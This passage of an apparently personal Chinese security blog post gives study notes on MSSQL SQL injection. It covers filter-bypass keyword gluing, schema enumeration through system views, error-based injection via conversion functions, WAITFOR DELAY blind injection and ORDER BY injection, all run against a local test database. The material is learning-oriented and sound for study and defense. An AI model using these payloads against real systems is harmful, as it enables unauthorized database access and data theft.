+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, </span><br><span class="line">         [<span class="keyword">value</span>] <span class="operator">=</span> stuff((</span><br><span class="line">                 <span class="keyword">SELECT</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> [<span class="keyword">value</span>] </span><br><span class="line">                   <span class="keyword">FROM</span> test01..stufftest t </span><br><span class="line">                  <span class="keyword">WHERE</span> t.id <span class="operator">=</span> test01..stufftest.id </span><br><span class="line">                    <span class="keyword">FOR</span> xml path(<span class="string">&#x27;&#x27;</span>)) , <span class="number">1</span> , <span class="number">1</span> , <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">    <span class="keyword">FROM</span> test01..stufftest </span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804101331386.png" alt="image-20210804101331386"></p>
+<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MSSQL中加号可以拼接字符char(97)+char(98)=&#x27;ab&#x27;</span><br><span class="line">MSSQL中使用反引号包裹字符串会报错</span><br></pre></td></tr></table></figure>
+
+<p>浮点数粘连关键字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1.</span>eunion <span class="keyword">select</span> xxxxxxx				等同于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> xxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>科学计数法粘连关键字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1e0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,db_name() <span class="keyword">from</span> <span class="keyword">user</span>			等同于</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,db_name() <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ascii()</span><br><span class="line">len()</span><br><span class="line">substring(&#x27;asd&#x27;,1,1)			-- &#x27;a&#x27;</span><br><span class="line">char()</span><br></pre></td></tr></table></figure>
+
+<h1 id="基本注入流程"><a href="#基本注入流程" class="headerlink" title="基本注入流程"></a>基本注入流程</h1><h2 id="获取库数量"><a href="#获取库数量" class="headerlink" title="获取库数量"></a>获取库数量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(name) <span class="keyword">from</span> master..sysdatabases;</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">1</span>);			<span class="comment">--dbid是渐增的，返回空时表示超过最大值</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;model&#x27;</span>,<span class="string">&#x27;msdb&#x27;</span>,<span class="string">&#x27;ReportServer&#x27;</span>,<span class="string">&#x27;ReportServerTempDB&#x27;</span>,<span class="string">&#x27;tempdb&#x27;</span>);		</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> db_name(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取表数量"><a href="#获取表数量" class="headerlink" title="获取表数量"></a>获取表数量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;			<span class="comment">-- xtype=&#x27;U&#x27;表示由用户创建</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01.sys.objects <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01.sys.tables;</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01.information_schema.tables;</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;			<span class="comment">-- xtype=&#x27;U&#x27;表示由用户创建</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01.sys.objects <span class="keyword">where</span> type<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01.sys.tables;</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> test01.information_schema.tables;</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取列数量"><a href="#获取列数量" class="headerlink" title="获取列数量"></a>获取列数量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01..syscolumns <span class="keyword">where</span> id <span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;user2&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01.sys.columns <span class="keyword">where</span> object_id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> test01.information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01..syscolumns <span class="keyword">where</span> id <span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test01..sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;user2&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01.sys.columns <span class="keyword">where</span> object_id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> test01..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>OBJECT_ID(<span class="string">&#x27;test01..users&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> test01.information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>……</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>MSSQL的报错注入基本是基于string转int时的数据类型转换错误。</p>
+<h2 id="函数报错"><a href="#函数报错" class="headerlink" title="函数报错"></a>函数报错</h2><p>常用报错函数如下</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>报错用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CONVERT()</td>
+<td>CONVERT(int,DB_NAME())</td>
+</tr>
+<tr>
+<td>CAST()</td>
+<td>CAST(DB_NAME() as int)</td>
+</tr>
+<tr>
+<td>FILE_NAME ()</td>
+<td>file_name(DB_NAME())</td>
+</tr>
+<tr>
+<td>DB_NAME()</td>
+<td>db_name(DB_NAME())</td>
+</tr>
+<tr>
+<td>COL_NAME()</td>
+<td>COL_NAME(DB_NAME(),1)</td>
+</tr>
+<tr>
+<td>FILEGROUP_NAME()</td>
+<td>FILEGROUP_NAME(DB_NAME())</td>
+</tr>
+<tr>
+<td>OBJECT_NAME()</td>
+<td>OBJECT_NAME(DB_NAME(),1)</td>
+</tr>
+<tr>
+<td>SCHEMA_NAME()</td>
+<td>SCHEMA_NAME(DB_NAME())</td>
+</tr>
+<tr>
+<td>TYPE_NAME()</td>
+<td>TYPE_NAME(DB_NAME())</td>
+</tr>
+<tr>
+<td>USER_NAME()</td>
+<td>USER_NAME(DB_NAME())</td>
+</tr>
+</tbody></table>
+<p><strong>CONVERT()</strong></p>
+<p>定义：CONVERT(<em>data_type(length)</em>,<em>expression</em>,<em>style</em>)</p>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>data_type(length)</em></td>
+<td>规定目标数据类型（带有可选的长度）。</td>
+</tr>
+<tr>
+<td><em>expression</em></td>
+<td>规定需要转换的值。</td>
+</tr>
+<tr>
+<td><em>style</em></td>
+<td>规定日期/时间的输出格式。</td>
+</tr>
+</tbody></table>
+<p>注入使用示例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>(<span class="type">int</span>,DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729224422993.png" alt="image-20210729224422993"></p>
+<p><strong>CAST()</strong></p>
+<p>定义：CAST ( expression AS data_type [ ( length ) ] )<br>参数：<br>        expression     ：任何有效的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/t-sql/language-elements/expressions-transact-sql?view=sql-server-ver15">表达式</a>。<br>        data_type       ：目标数据类型。 这包括 xml、bigint 和sql_variant 。 不能使用别名数据类型。<br>        length             ：可选，字段长度。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(DB_NAME() <span class="keyword">as</span> <span class="type">int</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729230735623.png" alt="image-20210729230735623"></p>
+<p><strong>FILE_NAME ()</strong></p>
+<p>定义：FILE_NAME ( file_id )<br>参数：<br>        file_id    ：文件名称 <code>FILE_NAME</code> 将返回的文件标识号。 file_id 具有 int 数据类型。<br>注入用法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_name(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729224921249.png" alt="image-20210729224921249"></p>
+<p><strong>DB_NAME()</strong></p>
+<p>定义：DB_NAME ( database_id )<br>参数：<br>        database_id    ：    将返回其名称 <code>DB_NAME</code> 的数据库的标识号 (ID)。 如果对 <code>DB_NAME</code> 的调用省略 database_id，则 <code>DB_NAME</code> 返回当前数据库的名称。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> db_name(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729225223312.png" alt="image-20210729225223312"></p>
+<p><strong>COL_NAME()</strong></p>
+<p>定义：COL_NAME ( table_id , column_id )<br>参数：<br>        table_id    ：包含该列的表的标识号。 table_id 自变量具有一个 int 数据类型。<br>        column_id：列的标识号。 column_id 自变量具有一个 int 数据类型。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> COL_NAME(DB_NAME(),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729225501106.png" alt="image-20210729225501106"></p>
+<p><strong>FILEGROUP_NAME()</strong></p>
+<p>定义：FILEGROUP_NAME ( filegroup_id )<br>参数：<br>        filegroup_id    ：文件组名 <code>FILEGROUP_NAME</code> 将返回的文件组 ID 号。 filegroup_id 具有 smallint 数据类型。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> FILEGROUP_NAME(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729225802742.png" alt="image-20210729225802742"></p>
+<p><strong>OBJECT_NAME()</strong></p>
+<p>定义：OBJECT_NAME ( object_id [, database_id ] )<br>参数：<br>        object_id    ：要使用的对象的 ID。 object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象。<br>        database_id：要在其中查找对象的数据库的 ID。 database_id 的数据类型为 int。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> OBJECT_NAME(DB_NAME(),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729230026791.png" alt="image-20210729230026791"></p>
+<p><strong>SCHEMA_NAME()</strong></p>
+<p>定义：SCHEMA_NAME ( [ schema_id ] )<br>参数：<br>        schema_id    ：架构的 ID。 schema_id 是 int。如果没有定义 schema_id，则 SCHEMA_NAME 将返回调用方的默认架构的名称。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729230212026.png" alt="image-20210729230212026"></p>
+<p><strong>TYPE_NAME()</strong></p>
+<p>定义：TYPE_NAME ( type_id )<br>参数：<br>        type_id    ：要使用的类型的 ID。 type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TYPE_NAME(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729230350002.png" alt="image-20210729230350002"></p>
+<p><strong>USER_NAME()</strong></p>
+<p>定义：user_name([id])<br>参数：<br>        id    ：可选，当省略参数 id 时与 current_user 等效，如果指定 id 则表示对应数据库 id 的数据库用户名<br>注入用法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> USER_NAME(DB_NAME());</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730002247220.png" alt="image-20210730002247220"></p>
+<h2 id="运算符报错"><a href="#运算符报错" class="headerlink" title="运算符报错"></a><strong>运算符</strong>报错</h2><p>​        算数运算或条件运算时如果两边数据类型不一致，则会发生转换错误。但是，直接运行select 123=db_name()是不会自动触发算数运算或条件运算的，需要在where后使用或在case when中使用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span><span class="operator">=</span>db_name()) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">end</span>;		<span class="comment">-- case when中可以触发条件运算导致报错</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> master.sys.stats <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span>db_name();   <span class="comment">-- master.sys.stats是自带系统视图</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span><span class="operator">&gt;</span>db_name()) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">end</span>;		<span class="comment">-- case when中可以触发条件运算导致报错</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> master.sys.stats <span class="keyword">where</span> <span class="number">1</span><span class="operator">&gt;</span>db_name();   <span class="comment">-- master.sys.stats是自带系统视图</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="number">1</span><span class="operator">&lt;</span>db_name()) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">end</span>;		<span class="comment">-- case when中可以触发条件运算导致报错</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> master.sys.stats <span class="keyword">where</span> <span class="number">1</span><span class="operator">&lt;</span>db_name();   <span class="comment">-- master.sys.stats是自带系统视图</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729233615701.png" alt="image-20210729233615701"></p>
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210729233502799.png" alt="image-20210729233502799"></p>
+<h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><p>基本延时语句<code>waitfor delay &#39;0:0:1&#39;</code>，延时操作通常与条件判断配合使用，常用条件判断语句有2条</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 是一个执行模块，不返回值</span></span><br><span class="line">IF Boolean_expression</span><br><span class="line"><span class="keyword">BEGIN</span>		<span class="comment">-- 关键字可省略  BEGIN与END必须成对出现</span></span><br><span class="line">    &#123; statement_block &#125;</span><br><span class="line"><span class="keyword">END</span>			<span class="comment">-- 关键字可省略</span></span><br><span class="line"><span class="keyword">ELSE</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    &#123; statement_block &#125;</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使一个判断模块，会返回值</span></span><br><span class="line"><span class="keyword">CASE</span>   </span><br><span class="line"><span class="keyword">WHEN</span> Boolean_expression <span class="keyword">THEN</span> when_true_result_expression  </span><br><span class="line">[...n]  </span><br><span class="line">[<span class="keyword">ELSE</span> else_result_expression]  </span><br><span class="line"><span class="keyword">END</span> 		<span class="comment">-- 必须有</span></span><br></pre></td></tr></table></figure>
+
+<p>MSSQL中的waitfor delay与if语句都只是执行一个动作，不返回任何值，所以不能放在需要一个值的地方，比如直接跟在select后或order by后，而case when语句是会返回值的，所以可以直接跟在select或order by后边，也因此，waitfor delay不能用在case when语句当中。通常，MSSQL的延时注入使用如下形式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01..users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">0</span> if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">0</span>) WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test01..users if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">0</span>) WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210803234827989.png" alt="image-20210803234827989"></p>
+<p><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210804000523911.png" alt="image-20210804000523911"></p>
+<h1 id="Order-By后的注入"><a href="#Order-By后的注入" class="headerlink" title="Order By后的注入"></a>Order By后的注入</h1><p>​        order by后边需要跟数字或列名来辅助select模块的输出，由于这个模块的操作结果并不直接作为查询结果展现，SQL语法上union select也不能直接用于order by后边。因此，order by后做注入需要形成独立的执行模块，通过对正常输出结果的影响来判断这个独立执行模块的执行结果。</p>
+<p>1.报错注入 </p>
+<p>正常报错注入<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730100456169.png" alt="image-20210730100456169"></p>
+<h2 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h2><p>order by后边如果跟了不存在的列名会抛出列名无效错误<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730112529898.png" alt="image-20210730112529898"></p>
+<p>order by后边如果跟了无法与列名对应的字符串也会抛出列名无效错误<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730112735502.png" alt="image-20210730112735502"></p>
+<p>order by后边如果跟了与列名对应的字符串则不会报错<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730112915239.png" alt="image-20210730112915239"></p>
+<p>那么，下图中的查询语句应当报错才对，但实际上却没有报错<br><img src="SQL%E6%B3%A8%E5%85%A5-MSSQL.assets/image-20210730113750825.png" alt="image-20210730113750825"></p>
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ls11736/p/12392147.html">https://www.cnblogs.com/ls11736/p/12392147.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/handsometone1982/article/details/7655361">https://blog.csdn.net/handsometone1982/article/details/7655361</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></p>
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">mlccs</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://mlccs.github.io/2021/08/04/MSSQL%E6%B3%A8%E5%85%A5%C2%B7%E4%B8%80/">https://mlccs.github.io/2021/08/04/MSSQL%E6%B3%A8%E5%85%A5%C2%B7%E4%B8%80/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mlccs.github.io">!>-_-<!</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2021/08/04/XXE%E5%9F%BA%E7%A1%80/"><i class="fas fa-angle-left">&nbsp;</i><span>XXE</span></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="copyright">&copy;2021 By mlccs</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
